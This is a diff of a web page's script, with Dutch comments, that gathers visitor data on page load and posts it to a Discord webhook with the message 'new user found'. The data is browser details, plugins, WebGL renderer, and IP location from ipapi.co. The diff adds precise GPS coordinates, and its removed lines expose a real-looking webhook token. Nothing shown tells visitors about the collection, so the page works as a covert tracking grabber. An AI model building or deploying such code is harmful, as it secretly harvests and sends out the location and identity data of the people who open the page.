@@ -12,7 +12,7 @@
         async function getInfo() {
             let info = {};
 
-            // Basis browser info
+            // Basis info
             info.userAgent = navigator.userAgent;
             info.language = navigator.language;
             info.platform = navigator.platform;
@@ -28,7 +28,7 @@
                 info.plugins.push(navigator.plugins[i].name);
             }
 
-            // WebGL Info (grafische kaart)
+            // WebGL
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -40,7 +40,7 @@
                 info.webglRenderer = "Niet beschikbaar";
             }
 
-            // IP en locatie via externe API
+            // IP-locatie
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
@@ -53,26 +53,47 @@
                 info.ip = "Niet beschikbaar";
             }
 
-            document.getElementById('info').textContent = JSON.stringify(info, null, 2);
+            // GPS-locatie (precies)
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        info.gpsLatitude = position.coords.latitude;
+                        info.gpsLongitude = position.coords.longitude;
+                        info.gpsAccuracy = position.coords.accuracy;
+                        sendInfo(info);
+                    },
+                    (error) => {
+                        info.gpsError = error.message;
+                        sendInfo(info);
+                    }
+                );
+            } else {
+                info.gps = "Niet ondersteund";
+                sendInfo(info);
+            }
 
-            // Verstuur naar Discord Webhook
-            const webhookUrl = 'https://discord.com/api/webhooks/1347877842725371984/SSQUXuH1EbjqDA-UEXf9d_uik63AvOEyG19LiRFbdZuB9XsRpohp37zbFe9T0gCNxnKE';
-            const payload = {
-                content: 'Nieuwe gebruiker gevonden!',
-                embeds: [{
-                    title: "Gebruikersinformatie",
-                    description: "```json\n" + JSON.stringify(info, null, 2) + "\n```"
-                }]
-            };
+            function sendInfo(info) {
+                document.getElementById('info').textContent = JSON.stringify(info, null, 2);
 
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
+                const webhookUrl = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN';
+                const payload = {
+                    content: 'Nieuwe gebruiker gevonden!',
+                    embeds: [{
+                        title: "Gebruikersinformatie",
+                        description: "```json\n" + JSON.stringify(info, null, 2) + "\n```"
+                    }]
+                };
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            }
         }
 
         getInfo();
     </script>
+
 </body>
 </html>
